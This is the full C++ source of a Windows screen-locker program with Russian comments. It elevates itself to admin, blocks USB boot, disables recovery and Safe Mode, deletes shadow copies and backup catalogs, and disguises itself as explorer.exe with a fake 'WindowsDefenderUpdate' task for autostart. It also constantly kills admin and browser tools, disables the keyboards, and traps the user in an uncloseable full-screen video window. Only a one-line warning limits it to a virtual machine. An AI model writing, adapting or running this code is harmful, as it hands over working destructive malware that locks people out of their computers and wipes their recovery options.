// language: C++, file: videolocker.cpp, target: Windows 11, MSVC
// Компиляция: cl /EHsc /O2 /utf-8 videolocker.cpp /link strmiids.lib ole32.lib oleaut32.lib uuid.lib advapi32.lib user32.lib gdi32.lib shell32.lib wbemuuid.lib
// ВНИМАНИЕ: деструктивный код. ТОЛЬКО VM СО СНАПШОТОМ.

#pragma execution_character_set("utf-8")

#include <windows.h>
#include <ole2.h>
#include <oleauto.h>
#include <dshow.h>
#include <wbemidl.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "wbemuuid.lib")

// ================= НАСТРОЙКИ =================
static const wchar_t* OPERATOR_NAME = L"pu709";
static const wchar_t* VIDEO_FILES[] = { L"video1.mp4", L"video2.mp4", L"video3.mp4" };
static const int VIDEO_COUNT = 3;

static const wchar_t* BLOCK_NAMES[] = {
    L"notepad.exe", L"taskmgr.exe", L"cmd.exe", L"regedit.exe",
    L"processhacker.exe", L"msconfig.exe", L"iexplore.exe",
    L"powershell.exe", L"pwsh.exe", L"wt.exe",
    L"diskpart.exe", L"mountvol.exe", L"format.com",
    L"procexp.exe", L"procexp64.exe", L"procmon.exe", L"procmon64.exe",
    L"autoruns.exe", L"autoruns64.exe", L"psexec.exe", L"psexec64.exe",
    L"wmic.exe", L"cscript.exe", L"wscript.exe", L"mshta.exe",
    L"reg.exe", L"sc.exe", L"net.exe", L"net1.exe", L"rundll32.exe",
    L"regsvr32.exe", L"msiexec.exe", L"control.exe", L"mmc.exe",
    L"tasklist.exe", L"taskkill.exe", L"schtasks.exe", L"bcdedit.exe",
    L"reagentc.exe", L"vssadmin.exe", L"wbadmin.exe", L"diskshadow.exe",
    L"chkdsk.exe", L"bootrec.exe", L"sfc.exe", L"dism.exe",
    L"bcdboot.exe", L"certutil.exe", L"bitsadmin.exe", L"curl.exe",
    L"py.exe", L"pyw.exe", L"python.exe", L"pythonw.exe",
    L"chrome.exe", L"msedge.exe", L"firefox.exe", L"opera.exe",
    L"brave.exe", L"vivaldi.exe",
    L"winget.exe", L"choco.exe", L"scoop.exe",
    L"setup.exe", L"install.exe", L"installer.exe",
    L"7z.exe", L"winrar.exe", L"winzip.exe", L"tar.exe", L"unzip.exe",
};
static const int BLOCK_COUNT = sizeof(BLOCK_NAMES) / sizeof(BLOCK_NAMES[0]);

static DWORD g_self_pid = 0;
static volatile bool g_stop = false;
static HWND g_main_hwnd = nullptr;

// ================= УТИЛИТЫ =================
static std::wstring GetExeDir() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring s(path);
    size_t pos = s.find_last_of(L"\\/");
    return (pos == std::wstring::npos) ? L"." : s.substr(0, pos);
}

static std::wstring JoinPath(const std::wstring& a, const std::wstring& b) {
    if (a.empty()) return b;
    if (a.back() == L'\\' || a.back() == L'/') return a + b;
    return a + L"\\" + b;
}

static bool FileExists(const std::wstring& p) {
    DWORD a = GetFileAttributesW(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

static void RunHidden(const std::wstring& cmd) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::wstring c = cmd;
    if (CreateProcessW(nullptr, c.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ================= ADMIN =================
static bool IsAdmin() {
    BOOL r = FALSE;
    PSID admins = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admins)) {
        CheckTokenMembership(nullptr, admins, &r);
        FreeSid(admins);
    }
    return r != FALSE;
}

static void ElevateIfNeeded() {
    if (IsAdmin()) return;
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = exe;
    sei.nShow = SW_SHOWNORMAL;
    ShellExecuteExW(&sei);
    ExitProcess(0);
}

// ================= WMI: ОТКЛЮЧЕНИЕ КЛАВИАТУР =================
static void DisableKeyboardsWMI() {
    IWbemLocator* loc = nullptr;
    IWbemServices* svc = nullptr;
    IEnumWbemClassObject* en = nullptr;

    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                  IID_IWbemLocator, (LPVOID*)&loc);
    if (FAILED(hr)) return;

    hr = loc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), nullptr, nullptr, nullptr,
                            0, nullptr, nullptr, &svc);
    if (FAILED(hr)) { loc->Release(); return; }

    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      nullptr, EOAC_NONE);

    hr = svc->ExecQuery(_bstr_t(L"WQL"),
                        _bstr_t(L"SELECT PNPDeviceID FROM Win32_Keyboard"),
                        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                        nullptr, &en);
    if (FAILED(hr)) { svc->Release(); loc->Release(); return; }

    while (en) {
        IWbemClassObject* obj = nullptr;
        ULONG ret = 0;
        hr = en->Next(WBEM_INFINITE, 1, &obj, &ret);
        if (ret == 0) break;
        VARIANT v;
        VariantInit(&v);
        if (SUCCEEDED(obj->Get(L"PNPDeviceID", 0, &v, nullptr, nullptr)) &&
            v.vt == VT_BSTR && v.bstrVal) {
            std::wstring id = v.bstrVal;
            std::wstring cmd = L"pnputil /disable-device \"" + id + L"\"";
            RunHidden(cmd);
        }
        VariantClear(&v);
        obj->Release();
        if (hr == WBEM_S_FALSE || hr == WBEM_S_TIMEDOUT) break;
    }
    if (en) en->Release();
    svc->Release();
    loc->Release();
}

// ================= RECOVERY / SAFE MODE / LIVE-USB =================
static void BlockLiveUsb() {
    RunHidden(L"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR\" /v Start /t REG_DWORD /d 4 /f");
    RunHidden(L"mountvol /N");
    RunHidden(L"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices\" /v Deny_All /t REG_DWORD /d 1 /f");
}

static void DisableRecoveryAndSafeMode() {
    RunHidden(L"reagentc /disable");
    RunHidden(L"bcdedit /set {default} recoveryenabled No");
    RunHidden(L"bcdedit /set {bootmgr} displaybootmenu No");
    RunHidden(L"bcdedit /set {default} bootmenupolicy Legacy");
    RunHidden(L"vssadmin delete shadows /all /quiet");
    RunHidden(L"wbadmin delete catalog -quiet");
    RunHidden(L"reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\" /f");
    RunHidden(L"reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\" /f");
}

// ================= AUTOSTART =================
static void InstallAutostart() {
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    std::wstring line = L"\"" + std::wstring(exe) + L"\"";
    std::wstring reg = L"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v explorer /t REG_SZ /d \"" + line + L"\" /f";
    RunHidden(reg);
    std::wstring sch = L"schtasks /create /tn WindowsDefenderUpdate /tr \"" + line + L"\" /sc onlogon /rl highest /f";
    RunHidden(sch);
}

static void SelfMasquerade() {
    wchar_t appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) return;
    std::wstring dst = std::wstring(appdata) + L"\\Microsoft\\explorer.exe";
    wchar_t src[MAX_PATH];
    GetModuleFileNameW(nullptr, src, MAX_PATH);
    if (_wcsicmp(src, dst.c_str()) != 0) {
        CopyFileW(src, dst.c_str(), FALSE);
    }
}

// ================= KILL =================
static bool NameBlocked(const wchar_t* name) {
    for (int i = 0; i < BLOCK_COUNT; ++i) {
        if (_wcsicmp(name, BLOCK_NAMES[i]) == 0) return true;
    }
    return false;
}

static void KillBlocked() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (pe.th32ProcessID == g_self_pid) continue;
            if (pe.th32ParentProcessID == g_self_pid) continue;
            if (NameBlocked(pe.szExeFile)) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) {
                    TerminateProcess(h, 1);
                    CloseHandle(h);
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

static void BlockingLoop() {
    while (!g_stop) {
        KillBlocked();
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
}

// ================= KEYBOARD HOOK =================
static HHOOK g_kb_hook = nullptr;

static LRESULT CALLBACK KbProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        return 1;
    }
    return CallNextHookEx(g_kb_hook, nCode, wParam, lParam);
}

static void KeyboardHookLoop() {
    g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, GetModuleHandleW(nullptr), 0);
    if (!g_kb_hook) return;
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(g_kb_hook);
    g_kb_hook = nullptr;
}

// ================= DIRECTSHOW ВИДЕО =================
class VideoPlayer {
public:
    IGraphBuilder* graph = nullptr;
    IMediaControl* control = nullptr;
    IMediaEventEx* events = nullptr;
    IVideoWindow* window = nullptr;
    int index = 0;
    bool initialized = false;

    bool Init(HWND hwnd) {
        if (FAILED(CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER,
                                    IID_IGraphBuilder, (void**)&graph))) return false;
        graph->QueryInterface(IID_IMediaControl, (void**)&control);
        graph->QueryInterface(IID_IMediaEventEx, (void**)&events);
        graph->QueryInterface(IID_IVideoWindow, (void**)&window);
        if (window) {
            window->put_Owner((OAHWND)hwnd);
            window->put_WindowStyle(WS_CHILD | WS_CLIPSIBLINGS);
            window->put_FullScreenMode(OATRUE);
            window->put_AutoShow(OATRUE);
        }
        if (events) events->SetNotifyWindow((OAHWND)hwnd, WM_APP + 1, 0);
        initialized = true;
        return true;
    }

    void ReleaseGraph() {
        if (control) { control->Stop(); control->Release(); control = nullptr; }
        if (events) { events->Release(); events = nullptr; }
        if (window) { window->put_Owner(0); window->Release(); window = nullptr; }
        if (graph) { graph->Release(); graph = nullptr; }
    }

    bool Play(const std::wstring& path) {
        if (!initialized) return false;
        ReleaseGraph();
        if (FAILED(CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER,
                                    IID_IGraphBuilder, (void**)&graph))) return false;
        graph->QueryInterface(IID_IMediaControl, (void**)&control);
        graph->QueryInterface(IID_IMediaEventEx, (void**)&events);
        graph->QueryInterface(IID_IVideoWindow, (void**)&window);
        if (window && g_main_hwnd) {
            window->put_Owner((OAHWND)g_main_hwnd);
            window->put_WindowStyle(WS_CHILD | WS_CLIPSIBLINGS);
            window->put_FullScreenMode(OATRUE);
            window->put_AutoShow(OATRUE);
        }
        if (events) events->SetNotifyWindow((OAHWND)g_main_hwnd, WM_APP + 1, 0);
        if (FAILED(graph->RenderFile(path.c_str(), nullptr))) return false;
        if (control) control->Run();
        return true;
    }

    void NextAndPlay() {
        index = (index + 1) % VIDEO_COUNT;
        std::wstring dir = GetExeDir();
        std::wstring path = JoinPath(dir, VIDEO_FILES[index]);
        if (FileExists(path)) Play(path);
    }

    void Release() {
        ReleaseGraph();
        initialized = false;
    }
};

// ================= ГЛАВНОЕ ОКНО =================
static VideoPlayer* g_player = nullptr;

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE: {
        g_main_hwnd = hwnd;
        g_player = new VideoPlayer();
        g_player->Init(hwnd);
        std::wstring dir = GetExeDir();
        for (int i = 0; i < VIDEO_COUNT; ++i) {
            std::wstring p = JoinPath(dir, VIDEO_FILES[i]);
            if (FileExists(p)) {
                g_player->index = i;
                g_player->Play(p);
                break;
            }
        }
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0,
                     GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                     SWP_SHOWWINDOW);
        // Клавиатуры отключаем после создания окна
        DisableKeyboardsWMI();
        return 0;
    }
    case WM_APP + 1: {
        if (g_player) {
            long ev = 0, p1 = 0, p2 = 0;
            while (g_player->events &&
                   g_player->events->GetEvent(&ev, &p1, &p2, 0) == S_OK) {
                if (ev == EC_COMPLETE) {
                    g_player->NextAndPlay();
                }
                g_player->events->FreeEventParams(ev, p1, p2);
            }
        }
        return 0;
    }
    case WM_CLOSE:
        return 0;
    case WM_DESTROY:
        g_stop = true;
        if (g_player) { g_player->Release(); delete g_player; g_player = nullptr; }
        PostQuitMessage(0);
        return 0;
    case WM_KEYDOWN:
    case WM_SYSKEYDOWN:
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static int RunLocker() {
    WNDCLASSW wc{};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandleW(nullptr);
    wc.lpszClassName = L"VideoLockerClass";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST,
        L"VideoLockerClass", OPERATOR_NAME,
        WS_POPUP | WS_VISIBLE,
        0, 0,
        GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, GetModuleHandleW(nullptr), nullptr);

    if (!hwnd) return 1;

    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0,
                 GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                 SWP_SHOWWINDOW);
    ShowWindow(hwnd, SW_SHOW);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

// ================= ENTRY =================
int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    ElevateIfNeeded();
    g_self_pid = GetCurrentProcessId();

    BlockLiveUsb();
    DisableRecoveryAndSafeMode();
    SelfMasquerade();
    InstallAutostart();

    std::thread(BlockingLoop).detach();
    std::thread(KeyboardHookLoop).detach();

    int rc = RunLocker();
    CoUninitialize();
    return rc;
}
